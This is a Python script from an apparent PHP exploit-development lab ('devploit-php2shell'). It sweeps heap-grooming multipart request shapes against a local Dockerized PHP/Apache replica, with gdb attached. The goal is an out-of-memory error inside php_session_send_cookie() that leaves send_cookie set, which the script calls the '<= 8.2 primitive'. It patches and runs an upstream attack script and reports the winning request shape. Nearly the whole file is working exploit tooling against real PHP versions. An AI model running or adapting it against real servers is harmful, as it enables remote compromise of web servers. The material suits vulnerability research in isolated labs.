#!/usr/bin/env python3
"""Sweep request-A shapes until the OOM lands inside php_session_send_cookie().

Keeps one gdb session attached for the whole sweep, so each request appends

    SEND_COOKIE heap=... real=... limit=... fs11=... freepages=... send_cookie=1
    MM_SAFE_ERROR real=... limit=... send_cookie=N
    #0 ... #1 ... #2 ... (backtrace)

to the log.  The target is a request whose MM_SAFE_ERROR backtrace contains
php_url_encode (the 121-byte allocation of php_url_encode_impl) *and* whose
send_cookie is still 1 at the OOM - that is exactly the <= 8.2 primitive:
php_session_reset_id() never reaches "PS(send_cookie) = 0".

The shape knobs (upstream tools/send_a_oom5.py):
    S   number of 103-byte-name / 8-byte-value fillers  -> fills the bin-128 runs
    NB  number of BL-byte "big" fields                  -> bulk page consumption
    X   number of 231-byte trimmer fields              -> fine page consumption
    K   number of KL-byte tail fields (right before the file part)
    KL  tail value length
    FL  file part field-name length

Local disposable containers only.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))

import php2shell_matrix as M  # noqa: E402

PYTHON = "/usr/bin/python3"


def gdb_script() -> str:
    """Same probe as heap_probe.py, but the breakpoints stay live for a sweep."""
    src = open(os.path.join(LAB, "heap_probe.py"), encoding="utf-8").read()
    body = src.split('GDB_SCRIPT = r"""', 1)[1].split('"""', 1)[0]
    return body


def patch_a(port: int, out_path: str, short_filename: bool = True) -> str:
    src = open(os.path.join(VENDOR, "tools", "send_a_oom5.py"),
               encoding="utf-8").read()
    src = src.replace("127.0.0.1:8088", f"127.0.0.1:{port}")
    src = src.replace("('127.0.0.1', 8088)", f"('127.0.0.1', {port})")
    src = src.replace("'/tmp/a_oom4.resp'", repr(out_path))
    if short_filename:
        # 103-byte filename -> a 128-byte bin block; a short one keeps the
        # file part out of the bin-128 runs so it needs no fresh page.
        src = src.replace("'A' * 99 + '.txt'", "'a.txt'")
    path = os.path.join("/tmp", f"sweep_a_{port}.py")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(src)
    return path


def worker_pid(name: str) -> int | None:
    r = subprocess.run(["docker", "top", name, "-eo", "pid,ppid,comm"],
                       capture_output=True, text=True)
    pids = [int(l.split()[0]) for l in r.stdout.splitlines()[1:]
            if l.split() and l.split()[-1] == "apache2"]
    return pids[-1] if pids else None


def parse_segment(seg: str) -> dict:
    out = {"send_cookie_line": None, "oom_sc": None, "site": "none",
           "freepages": None, "fs11": None}
    m = re.search(r"freepages=(\d+)", seg)
    if m:
        out["freepages"] = int(m.group(1))
    m = re.search(r"fs11=(0x[0-9a-f]+)/(\d+)", seg)
    if m:
        out["fs11"] = "%s/%s" % (m.group(1), m.group(2))
    m = re.search(r"MM_SAFE_ERROR .*send_cookie=(\d+)", seg)
    if m:
        out["oom_sc"] = int(m.group(1))
        frames = []
        for line in seg.splitlines():
            fm = re.match(r"#(\d+)\s+0x[0-9a-f]+ in (\S+)", line)
            if fm:
                frames.append(fm.group(2))
        out["frames"] = frames[:6]
        joined = " ".join(frames)
        if "php_url_encode" in joined or "php_session" in joined:
            out["site"] = "cookie"
        elif "php_sapi_filter" in joined or "rfc1867" in joined:
            out["site"] = "parser"
        elif "init_op_array" in joined or "zend_compile" in joined:
            out["site"] = "compile"
        else:
            out["site"] = "other"
    return out


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--image", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--name", required=True)
    ap.add_argument("--shapes", required=True,
                    help="semicolon separated S,NB,BL,X,K,KL,FL tuples")
    ap.add_argument("--ini", default="php-off.ini")
    ap.add_argument("--warm-len", type=int, default=0)
    ap.add_argument("--w64-len", type=int, default=0)
    ap.add_argument("--out", default=None)
    ap.add_argument("--fresh", action="store_true",
                    help="restart the container before every shape (fresh worker)")
    args = ap.parse_args()

    M.docker("rm", "-f", args.name)
    outdir = M.prepare_lab_out(os.path.join(M.LAB, "out", args.name))
    M.docker(
        "run", "-d", "--name", args.name,
        "-p", f"127.0.0.1:{args.port}:80",
        "-v", f"{M.LAB}/webroot:/var/www/html:ro",
        "-v", f"{M.LAB}/{args.ini}:/usr/local/etc/php/conf.d/zz-matrix.ini:ro",
        "-v", f"{M.LAB}/apache.conf:/etc/apache2/conf-enabled/zz-matrix.conf:ro",
        "-v", f"{outdir}:/out",
        args.image, timeout=900,
    )
    if not M.wait_http(f"http://127.0.0.1:{args.port}/index.php"):
        raise SystemExit("replica did not answer")

    with open("/tmp/sweep.gdb", "w", encoding="utf-8") as fh:
        fh.write(gdb_script())
    log = "/tmp/sweep_gdb.log"
    open(log, "w").close()

    gdb_proc = [None]

    def attach_gdb():
        if gdb_proc[0] is not None:
            try:
                gdb_proc[0].kill()
                gdb_proc[0].wait(timeout=10)
            except Exception:
                pass
        wp = worker_pid(args.name)
        if not wp:
            raise SystemExit("no worker pid")
        gdb_proc[0] = subprocess.Popen(
            ["sudo", "-n", "gdb", "-p", str(wp), "-batch", "-x", "/tmp/sweep.gdb"],
            stdout=open(log, "ab"), stderr=subprocess.STDOUT)
        time.sleep(7)

    attach_gdb()

    a_tool = patch_a(args.port, "/tmp/sweep_a.resp")
    env = dict(os.environ)
    env.update({"WARM_LEN": str(args.warm_len), "W64_LEN": str(args.w64_len),
                "W64_N": "1" if args.w64_len else "0"})

    best = None
    table = []
    for shape in args.shapes.split(";"):
        shape = shape.strip()
        if not shape:
            continue
        vals = [int(v) for v in shape.split(",")]
        f, s, nb, bl, x, k, kl, fl = vals
        if args.fresh:
            M.docker("restart", args.name, timeout=300)
            if not M.wait_http(f"http://127.0.0.1:{args.port}/index.php"):
                print("replica did not come back", flush=True)
                continue
            attach_gdb()
        pos = os.path.getsize(log)
        try:
            proc = subprocess.run([PYTHON, a_tool, str(f), str(s), str(nb), str(bl),
                            str(x), str(k), str(kl), str(fl), "F" * fl],
                           env=env, capture_output=True, timeout=240)
            if proc.stdout or proc.stderr:
                print("   A out:", (proc.stdout or b"")[:120],
                      (proc.stderr or b"")[:200], flush=True)
        except subprocess.TimeoutExpired:
            print(f"S={s} NB={nb} X={x} K={k} KL={kl}: timeout", flush=True)
            continue
        time.sleep(0.8)
        with open(log, "rb") as fh:
            fh.seek(pos)
            seg = fh.read().decode("utf-8", "replace")
        info = parse_segment(seg)
        print(f"F={f} S={s} NB={nb} X={x} K={k} KL={kl} FL={fl} -> site={info['site']:<8} "
              f"freepages={info['freepages']} fs11={info['fs11']} "
              f"oom_send_cookie={info['oom_sc']} "
              f"{'>'.join(info.get('frames', [])[:4])}", flush=True)
        table.append({"shape": shape, **info})
        if info["site"] == "cookie" and info["oom_sc"] == 1:
            best = {"shape": shape, "f": f, "s": s, "nb": nb, "bl": bl, "x": x,
                    "k": k, "kl": kl, "fl": fl, "warm_len": args.warm_len,
                    "w64_len": args.w64_len, "freepages": info["freepages"]}
            print("[+] OOM inside php_session_send_cookie with send_cookie=1", flush=True)
            break

    out = best or {"failed": True, "table": table}
    if args.out:
        json.dump(out, open(args.out, "w"), indent=2)
    M.docker("rm", "-f", args.name)
    return 0 if best else 1


if __name__ == "__main__":
    sys.exit(main())
